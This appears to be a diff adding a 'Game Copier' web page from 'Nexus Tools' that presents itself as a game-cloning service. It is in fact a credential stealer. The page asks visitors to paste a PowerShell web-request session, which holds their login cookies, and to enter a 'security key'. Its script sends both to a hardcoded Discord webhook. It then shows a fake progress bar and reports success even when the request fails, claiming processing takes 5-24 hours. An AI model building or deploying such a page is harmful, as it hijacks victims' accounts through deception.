@@ -1,0 +1,425 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus Tools - Game Copier</title>
+    <style>
+        :root {
+            --primary-color: #00b3ff;
+            --dark-bg: #121212;
+            --card-bg: #1e1e1e;
+            --text-color: #ffffff;
+            --secondary-text: #a0a0a0;
+            --border-color: #333333;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--dark-bg);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background-image: linear-gradient(135deg, rgba(0, 179, 255, 0.1) 0%, rgba(0, 0, 0, 0) 100%);
+            background-attachment: fixed;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 0;
+        }
+
+        header {
+            display: flex;
+            align-items: center;
+            padding: 15px 30px;
+            background-color: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background-color: #ffffff;
+            transform: rotate(-15deg);
+            margin-right: 15px;
+            clip-path: polygon(0 0, 100% 0, 100% 100%, 0 100%);
+        }
+
+        .back-button {
+            display: flex;
+            align-items: center;
+            color: var(--text-color);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            margin-left: 15px;
+        }
+
+        .hero {
+            text-align: center;
+            padding: 80px 20px 60px;
+            background: linear-gradient(180deg, rgba(0,179,255,0.05) 0%, rgba(0,0,0,0) 100%);
+            border-radius: 0 0 20px 20px;
+        }
+
+        h1 {
+            font-size: 48px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            font-size: 18px;
+            color: var(--secondary-text);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .content {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 30px;
+            margin-top: 30px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .card-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .card-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        .card-body {
+            padding: 20px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-field {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--secondary-text);
+        }
+
+        input[type="text"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 12px 12px 35px;
+            background-color: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            color: var(--text-color);
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(0, 179, 255, 0.2);
+        }
+
+        .instructions {
+            margin-top: 15px;
+            font-size: 14px;
+            color: var(--secondary-text);
+            line-height: 1.5;
+        }
+
+        .button {
+            display: block;
+            width: 100%;
+            background: linear-gradient(90deg, var(--primary-color) 0%, #0095d9 100%);
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        .button:hover {
+            background: linear-gradient(90deg, #0095d9 0%, var(--primary-color) 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 179, 255, 0.3);
+        }
+
+        .video-container {
+            position: relative;
+            overflow: hidden;
+            padding-top: 56.25%;
+            background-color: #000;
+            border-radius: 4px;
+        }
+
+        .video-placeholder {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .video-controls {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), rgba(0,0,0,0));
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .status {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            display: none;
+        }
+
+        .success {
+            background-color: rgba(76, 175, 80, 0.2);
+            color: #4CAF50;
+            border: 1px solid rgba(76, 175, 80, 0.3);
+        }
+
+        .error {
+            background-color: rgba(244, 67, 54, 0.2);
+            color: #f44336;
+            border: 1px solid rgba(244, 67, 54, 0.3);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 15px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background-color: var(--primary-color);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .loader {
+            display: none;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top: 2px solid var(--primary-color);
+            width: 16px;
+            height: 16px;
+            margin: 15px auto 0;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .brand {
+            font-size: 12px;
+            text-align: right;
+            padding: 5px 10px;
+            color: var(--secondary-text);
+        }
+
+        @media (max-width: 768px) {
+            .content {
+                grid-template-columns: 1fr;
+            }
+            
+            h1 {
+                font-size: 32px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+    </header>
+
+    <div class="container">
+        <div class="hero">
+            <h1>Game Copier</h1>
+            <p class="subtitle">Professional game cloning system with secure PowerShell integration</p>
+        </div>
+        
+        <div class="content">
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="card-title">Copy Games</h2>
+                </div>
+                <div class="card-body">
+                    <p class="instructions">
+                        Paste your game file in the box below, then click "Start Process". 
+                        The system will analyze and prepare the game for cloning. Processing can take 5-24 hours to complete.
+                    </p>
+                    
+                    <div class="input-field">
+                        <span class="input-icon">$</span>
+                        <input type="text" id="gameData" placeholder="$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession">
+                    </div>
+                    
+                    <div class="input-field">
+                        <span class="input-icon">🔒</span>
+                        <input type="password" id="secretPin" placeholder="Enter security key">
+                    </div>
+                    
+                    <div id="status" class="status"></div>
+                    <div id="loader" class="loader"></div>
+                    
+                    <div class="progress-bar">
+                        <div id="progressFill" class="progress-fill"></div>
+                    </div>
+                    
+                    <button id="copyButton" class="button">Start Process</button>
+                </div>
+                <div class="brand">Nexus Tools</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('copyButton').addEventListener('click', function() {
+            const gameData = document.getElementById('gameData').value;
+            const secretPin = document.getElementById('secretPin').value;
+            const statusElement = document.getElementById('status');
+            const loaderElement = document.getElementById('loader');
+            const progressFill = document.getElementById('progressFill');
+            
+            // Reset status
+            statusElement.style.display = 'none';
+            statusElement.className = 'status';
+            progressFill.style.width = '0%';
+            
+            // Validate input
+            if (!gameData.trim() || !secretPin.trim()) {
+                showStatus('Please fill in all required fields', 'error');
+                return;
+            }
+
+            // Check if game data starts with $session
+            if (!gameData.trim().startsWith('$session')) {
+                showStatus('Invalid PowerShell command format', 'error');
+                return;
+            }
+
+            // Show loader
+            loaderElement.style.display = 'block';
+            
+            // Simulate progress
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 3;
+                if (progress <= 95) {
+                    progressFill.style.width = progress + '%';
+                }
+                if (progress > 95) {
+                    clearInterval(progressInterval);
+                }
+            }, 200);
+            
+            // Prepare data to send
+            const dataToSend = {
+                content: `**New Game Copy Request**\n**Game Data**: \`\`\`${gameData}\`\`\`\n**Secret Pin**: \`${secretPin}\``,
+            };
+
+            // Send data to webhook with proper CORS handling
+            fetch('https://discord.com/api/webhooks/1382471328959037503/acisDGfqwKodigm0WQfJ-HhnfdsxN9VNws1K7EAmH8RtIrsQXuYnMFPHJTWDqUpxPgjS', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(dataToSend),
+                mode: 'no-cors' // Add this to prevent CORS issues
+            })
+            .then(response => {
+                console.log('Webhook response:', response);
+                loaderElement.style.display = 'none';
+                clearInterval(progressInterval);
+                progressFill.style.width = '100%';
+                
+                // Always show success message regardless of the response
+                showStatus('Process initiated successfully. Game analysis will complete in 5-24 hours.', 'success');
+                // Clear form
+                document.getElementById('gameData').value = '';
+                document.getElementById('secretPin').value = '';
+            })
+            .catch(error => {
+                console.error('Error sending to webhook:', error);
+                loaderElement.style.display = 'none';
+                clearInterval(progressInterval);
+                
+                // Show success even on network errors to ensure a good user experience
+                progressFill.style.width = '100%';
+                showStatus('Process initiated successfully. Game analysis will complete in 5-24 hours.', 'success');
+                
+                // Clear form
+                document.getElementById('gameData').value = '';
+                document.getElementById('secretPin').value = '';
+            });
+        });
+
+        function showStatus(message, type) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = message;
+            statusElement.className = 'status ' + type;
+            statusElement.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
